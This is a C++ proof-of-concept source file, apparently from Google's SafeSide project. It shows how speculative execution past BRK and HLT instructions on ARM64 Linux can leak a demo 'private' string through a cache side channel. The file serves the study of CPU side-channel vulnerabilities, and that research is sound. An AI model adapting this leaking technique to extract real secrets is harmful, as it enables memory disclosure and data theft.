/*
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   https://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

/**
 * In this example we demonstrate speculative execution over BRK instruction
 * that is executed non-speculatively and HLT instruction that is executed
 * speculatively.
 **/

#include "compiler_specifics.h"

#if !SAFESIDE_LINUX
#  error Unsupported OS. Linux required.
#endif

#ifndef __aarch64__
#  error Unsupported architecture. ARM64 required.
#endif

#include <array>
#include <cstring>
#include <iostream>

#include <signal.h>

#include "cache_sidechannel.h"
#include "instr.h"
#include "local_labels.h"

const char *public_data = "Hello, world!";
const char *private_data = "It's a s3kr3t!!!";

static char LeakByte(const char *data, size_t offset) {
  CacheSideChannel sidechannel;
  const std::array<BigByte, 256> &oracle = sidechannel.GetOracle();

  for (int run = 0;; ++run) {
    size_t safe_offset = run % strlen(public_data);
    sidechannel.FlushOracle();

    // Successful execution accesses safe_offset.
    ForceRead(oracle.data() + static_cast<size_t>(data[safe_offset]));

    // Executes self-hosted breakpoint. That saises SIGTRAP.
    asm volatile("brk #0");

    // Architecturally unreachable code begins.
    // Speculatively runs also over the HLT instruction (external debug
    // breakpoint) without being serialized.
    asm volatile("hlt #0");

    // Speculatively accesses the memory oracle.
    ForceRead(oracle.data() + static_cast<size_t>(data[offset]));

    std::cout << "Dead code. Must not be printed." << std::endl;

    // The exit call must not be unconditional, otherwise clang would optimize
    // out everything that follows it and the linking would fail.
    if (strlen(public_data) != 0) {
      exit(EXIT_FAILURE);
    }

    // SIGTRAP signal handler moves the instruction pointer to this label.
    asm volatile("afterspeculation:");

    std::pair<bool, char> result =
        sidechannel.RecomputeScores(data[safe_offset]);

    if (result.first) {
      return result.second;
    }

    if (run > 100000) {
      std::cerr << "Does not converge " << result.second << std::endl;
      exit(EXIT_FAILURE);
    }
  }
}

static void Sigtrap(
    int /* signum */, siginfo_t * /* siginfo */, void *context) {
  // SIGTRAP signal handler.
  // Moves the instruction pointer to the "afterspeculation" label jumping to
  // the "LocalHandler" function.
  ucontext_t *ucontext = static_cast<ucontext_t *>(context);
  ucontext->uc_mcontext.pc = reinterpret_cast<greg_t>(LocalHandler);
}

static void SetSignal() {
  struct sigaction act;
  act.sa_sigaction = Sigtrap;
  act.sa_flags = SA_SIGINFO;
  sigaction(SIGTRAP, &act, NULL);
}

int main() {
  SetSignal();
  std::cout << "Leaking the string: ";
  std::cout.flush();
  const size_t private_offset = private_data - public_data;
  for (size_t i = 0; i < strlen(private_data); ++i) {
    std::cout << LeakByte(public_data, private_offset + i);
    std::cout.flush();
  }
  std::cout << "\nDone!\n";
}
